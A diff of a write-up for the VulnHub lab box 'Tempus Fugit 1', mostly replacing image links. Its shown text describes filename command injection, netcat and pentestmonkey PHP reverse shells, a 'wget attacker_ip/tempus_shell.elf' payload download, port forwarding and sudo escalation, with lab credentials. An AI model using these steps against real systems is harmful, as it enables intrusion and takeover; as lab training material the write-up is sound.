@@ -44,13 +44,15 @@ Download from [vulnhub](https://www.vulnhub.com/entry/tempus-fugit-1,346/):
 - [**Root Flag**](#root-flag)
 
 # Network Scanning
-## Netdiscover
-![](https://github.com/azul-007/boxes/blob/main/images/netdiscover.png)
+## Netdiscover!
+
+![netdiscover](https://user-images.githubusercontent.com/15880042/112770385-93d60100-8ff4-11eb-8e1f-1da1f0e64004.png)
+
 
 Kicking things off with a netdiscover scan. Ensure that you're operating in a NAT environment. Never put vulnerable machines
 on your real network. Victim IP has been found, **192.168.19.149**
 ## Nmap Scan
-![](https://github.com/azul-007/boxes/blob/main/images/nmap.png)
+[nmap](https://user-images.githubusercontent.com/15880042/112770396-9d5f6900-8ff4-11eb-9eb0-001676e13ff2.png)
 
 I scanned the target with my [custom python script](https://github.com/azul-007/tools/blob/master/reconnaissance/boxscan.py). This script creates a box with the name of the target and executes nmap, dirb and nikto scans. It will then move into the target directory and create an image directory. The output of the scans are sent to text files with the target name appended to each scan type.
 
@@ -58,41 +60,47 @@ Here we see that only port 80 is open, running an nginx server 1.15.3 and OS is 
 
 # Enumeration
 ## Browsing Webpage
-![](https://github.com/azul-007/boxes/blob/main/images/upload_button.png)
+![upload_button](https://user-images.githubusercontent.com/15880042/112770456-ca138080-8ff4-11eb-99c7-9a8fb5b8abea.png)
+
 
 Navigate to the page at http://192.168.19.149
 
 ## Command Injection Test with Burp
 
-![](https://github.com/azul-007/boxes/blob/main/images/upload_page.png)
+![upload_page](https://user-images.githubusercontent.com/15880042/112770621-7d7c7500-8ff5-11eb-886a-5dbeea376e56.png)
+
 
 Browsing the page you'll notice an upload tab. This immediately catches my attention. Any time you come across a web page with upload capabilities, you should investigate and test to see what you can/can't upload. Intercept the request with Burp proxy and try modifying the extension. Here I tested for command injection with "id". If successful, it should display the contents of the text as well as the ouput of the "id" command.
 
 > With Burp Suite open upload your file...
 
-![](https://github.com/azul-007/boxes/blob/main/images/command_injection_test.png)
+![command_injection_test](https://user-images.githubusercontent.com/15880042/112770634-9127db80-8ff5-11eb-8ae6-d66564dc8791.png)
+
 
 > Inject "id" after test3.txt;
 
-![](https://github.com/azul-007/boxes/blob/main/images/command_injection_test2.png.png)
+![command_injection_test2 png](https://user-images.githubusercontent.com/15880042/112770737-17dcb880-8ff6-11eb-98ea-81df78dd9110.png)
+
 
 > Success! Command injection is possible
 
 Ok, let's see what we can find in the current directory. Intercept the request again. But for this command injection attempt we're going to use **ls -l**
 
-![](https://github.com/azul-007/boxes/blob/main/images/command_injection.png)
+![command_injection](https://user-images.githubusercontent.com/15880042/112770742-232fe400-8ff6-11eb-9419-c627d75d9e70.png)
 
 Look closely, you'll see a python file titled main.py. Intercept the request again and attempt to list the contents of main.py. Dot notation is being implemented, preventing you from seeing the contents. Perform another intercept, this time using a wildcard on main.py
 
-![](https://github.com/azul-007/boxes/blob/main/images/cat_main_2.png)
+![cat_main_2](https://user-images.githubusercontent.com/15880042/112770847-ae10de80-8ff6-11eb-96fa-f112df8632c4.png)
 
-![](https://github.com/azul-007/boxes/blob/main/images/cat_main_Creds.png)
+![cat_main_Creds](https://user-images.githubusercontent.com/15880042/112770870-c84abc80-8ff6-11eb-87be-88ee198ce377.png)
+
 
 > Credentials: 'someuser', 'b232a4da4c104798be4613ab76d26efda1a04606'
 
 ## Bypassing Dot Notation
 
-![](https://github.com/azul-007/boxes/blob/main/images/smartconversion.png)
+![smartconversion](https://user-images.githubusercontent.com/15880042/112770882-d8fb3280-8ff6-11eb-95a2-657bbd5f92f9.png)
+
 
 I tried uploading a netcat reverse shell via command injection with the given IP, however, it would not work. After some trial and error, I got curious and converted the IP to a long number via [smartconversion](https://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx)
 
@@ -100,7 +108,8 @@ I tried uploading a netcat reverse shell via command injection with the given IP
 
 Because we've proven that command injection works. Let's attempt to upload a netcat reverse shell. Use [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) for all your reverse shell needs!
 
-![](https://github.com/azul-007/boxes/blob/main/images/netcat_reverse_shell2.png)
+![netcat_reverse_shell2](https://user-images.githubusercontent.com/15880042/112772123-29758e80-8ffd-11eb-8a95-8c34a9a2833c.png)
+
 
 ## Break out of Shell
 
@@ -109,17 +118,19 @@ python;
 
 python -c "import pty;pty.spawn('/bin/bash')"
 
-![](https://github.com/azul-007/boxes/blob/main/images/python_break_shell.png)
+![python_break_shell](https://user-images.githubusercontent.com/15880042/112772136-37c3aa80-8ffd-11eb-914a-2070a1ce4a15.png)
+
 
 ## False Root
 
 Enumerating the root directory you'll find a text file. List the contents annnnnnd...they got us with the okey doke...bastards lol
 
-![](https://github.com/azul-007/boxes/blob/main/images/root_message.png)
+![root_message](https://user-images.githubusercontent.com/15880042/112772146-43af6c80-8ffd-11eb-811e-39323d0ac8c0.png)
+
 
 ## Further Enumeration
 
-![](https://github.com/azul-007/boxes/blob/main/images/root_directory_enumeration.png)
+![root_directory_enumeration](https://user-images.githubusercontent.com/15880042/112772157-5033c500-8ffd-11eb-85b2-a9bd7ad72855.png)
 
 
 Enumerating further...We again list all the content within /root/.ncftp with ls -la to reveal any hidden directories. There are three files here:
@@ -127,13 +138,15 @@ Enumerating further...We again list all the content within /root/.ncftp with ls 
   * init_v3 - file used by NcFTP to annotate first time usage
   * trace.234 - traffic trace of LibNcFTP.
 
-![](https://github.com/azul-007/boxes/blob/main/images/failed_connect_172_19_0_12.png)
+![failed_connect_172_19_0_12](https://user-images.githubusercontent.com/15880042/112772166-5d50b400-8ffd-11eb-8d52-b744d01a6522.png)
+
 
 The file trace.234 shows a failure to connect to 172.19.0.12 ... but this IP isn't in our subnet of 192.168.19.0/24. I got a little frustrated and reached out to @DCAU. He gave me a hint that the box is in a docker container and that they're actually a few containers. Which would explain the failed connection to 172.19.0.12.
 
 But what flavor of linux is running? Execute cat /etc/*release to uncover this mystery
 
-![](https://github.com/azul-007/boxes/blob/main/images/alpine_linux.png)
+![alpine_linux](https://user-images.githubusercontent.com/15880042/112772179-6b9ed000-8ffd-11eb-9a53-334adcf47b28.png)
+
 
 
 ## Docker Containers
@@ -144,7 +157,8 @@ So there are two ways I retroactively saw that I was in a docker container:
 
 Let's start with the second option. Notice the .dockerenv file has a size of 0 bytes.
 
-![](https://github.com/azul-007/boxes/blob/main/images/dockerenv.png)
+![dockerenv](https://user-images.githubusercontent.com/15880042/112772198-84a78100-8ffd-11eb-9da7-708d6a9ef815.png)
+
 
 And now to elaborate on the first option...
 
@@ -156,14 +170,16 @@ Going back to ~/ we see our usual directories but there is a peculiar one.. **/p
 
 We should try logging into 172.19.0.12. Before we do that, let's install lftp for apline linux. The command is **apk add lftp**
 
-![](https://github.com/azul-007/boxes/blob/main/images/lftp.png)
+![lftp](https://user-images.githubusercontent.com/15880042/112772214-99841480-8ffd-11eb-9c53-9a2c42c6b423.png)
+
 
 ## FTP CMS Credentials
 
 Using the credentials we found in 'Command Injection Test with Burp' log into 172.19.0.12: **lftp ftp://someuser@172.19.0.12**
 And we are successful logging in. List the contents and you'll find a cmscreds.txt file that reveales the admin CMS password: **hardEnough4u**
 
-![](https://github.com/azul-007/boxes/blobmain/images/cms_creds.png)
+![cms_creds](https://user-images.githubusercontent.com/15880042/112772223-a30d7c80-8ffd-11eb-9386-42117b029c39.png)
+
 
 Download the file by typing get cmscreds.txt and exit by typing 'bye'.
 
@@ -173,7 +189,8 @@ I was kinda lost at this point. Had to take a break and come back into my notes 
 
 First verify if nmap is installed. It is not, so install with apk add nmap. Now scan the 172.19.0.0 subnet.
 
-![](https://github.com/azul-007/boxes/blob/main/images/nmap_docker_containers.png)
+![nmap_docker_containers](https://user-images.githubusercontent.com/15880042/112772232-ac96e480-8ffd-11eb-8b92-1f8c70d28bc0.png)
+
 
 We have three machines:
   * 172.19.0.1
@@ -218,7 +235,9 @@ On the victim/target download the shell from attacker and give executable permis
 ````
 wget attacker_ip/tempus_shell.elf
 ````
-![](https://github.com/azul-007/boxes/blobmain/images/metasploit_and_tempus_payload.png)
+
+![metasploit_and_tempus_payload](https://user-images.githubusercontent.com/15880042/112772249-bb7d9700-8ffd-11eb-8fed-ef2b905419a9.png)
+
 
 ## Port Forwarding
 
@@ -228,7 +247,8 @@ Now we need to setup port forwarding rules
 portfwd add -l 8080 -p 8080 -r TARGET_IP
 ````
 
-![](https://github.com/azul-007/boxes/blob/main/images/portfwd.png)
+![portfwd](https://user-images.githubusercontent.com/15880042/112772260-c506ff00-8ffd-11eb-858f-dd10ce612124.png)
+
 
 Now with this port forwarded we can access the machines on the 172.19.0.0/16 subnetwork.
 
@@ -242,7 +262,8 @@ in the segment [Performing Nmap Scan on Target](#performing-nmap-scan-on-target)
 
 172.19.0.12 has port 8080 opened, naturally we attempt to access that webpage:
 
-![](https://github.com/azul-007/boxes/blob/main/images/172.19.0.1_8080_fail.png)
+![172 19 0 1_8080_fail](https://user-images.githubusercontent.com/15880042/112772276-d3edb180-8ffd-11eb-9c90-a768bf3aadfb.png)
+
 
 > Surprise, surprise we can.t -___-
 
@@ -258,21 +279,25 @@ apk add bind-tools
 
 Use the axfr command to initiate a zone transfer on the target.
 
-![](https://github.com/azul-007/boxes/blob/main/images/ourcms_mofo_pwn2.png)
+![ourcms_mofo_pwn2](https://user-images.githubusercontent.com/15880042/112772280-dfd97380-8ffd-11eb-9e53-96dfe617eee1.png)
+
 
 From the output, you will see an entry giving the name of the cms; ourcms.mofo.pwn
 
 Next edit your host file to show your host ip mapped to ourcms.mofo.pwn
 
-![](https://github.com/azul-007/boxes/blob/main/images/host_mapping.png)
+![host_mapping](https://user-images.githubusercontent.com/15880042/112772290-eb2c9f00-8ffd-11eb-93dc-b34e070559c6.png)
+
 
 Now navigate to http://ourcms.mofo.pwn:8080/ and wait for it...SUCCESS!!!!
 
-![](https://github.com/azul-007/boxes/blob/main/images/ourcms_page.png) 
+![ourcms_page](https://user-images.githubusercontent.com/15880042/112772316-16af8980-8ffe-11eb-9038-49f110b81dbe.png)
+
 
 Let's try http://ourcms.mofo.pwn:8080/admin/. Use the credentials found in [FTP CMS Credentials](#ftp-cms-credentials) with the username 'admin'.
 
-![](https://github.com/azul-007/boxes/blob/main/images/ourcms_admin.png)
+![ourcms_admin](https://user-images.githubusercontent.com/15880042/112772324-216a1e80-8ffe-11eb-8bf3-363c4f9701d7.png)
+
 
 # PHP Reverse Shell
 
@@ -283,7 +308,8 @@ We can upload a php reverse shell. Go to the Edit Theme option on the Theme tab.
 
 Run netcat on your host with port 6000. Download the php reverse shell script from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the $ip and $port variables to your host IP and port 6000. 
 
-![](https://github.com/azul-007/boxes/blob/main/images/pentest_monkey_php_reverse_shell.png)
+![pentest_monkey_php_reverse_shell](https://user-images.githubusercontent.com/15880042/112772334-2cbd4a00-8ffe-11eb-8056-d74107ef879d.png)
+
 
 Annnnnnnd houston we have a shell!!!
 
@@ -301,11 +327,13 @@ Change user to anthia:
 su anthia
 ````
 
-![](https://github.com/azul-007/boxes/blob/main/images/responder_creds.png)
+![responder_creds](https://user-images.githubusercontent.com/15880042/112772339-39da3900-8ffe-11eb-8a07-abb1fdf51a05.png)
+
 
 Enumerating as anthia, I found a mail directory under /var. Reading the contents of anthia shows an email that displays more creds! franky:9u4lw0r82bo7
 
-![](https://github.com/azul-007/boxes/blob/main/images/franky_creds.png)
+![franky_creds](https://user-images.githubusercontent.com/15880042/112772353-43fc3780-8ffe-11eb-8800-b8715a21d5dc.png)
+
 
 Change user to franky:
 ````
@@ -319,4 +347,5 @@ Issuing a sudo -l reveals franky can execute sudo on the nice command. Using [gt
 ./proof.sh
 ````
 
-![](https://github.com/azul-007/boxes/blob/main/images/root.png)
+![root](https://user-images.githubusercontent.com/15880042/112772363-50809000-8ffe-11eb-9805-4fdd6ace8fd5.png)
+
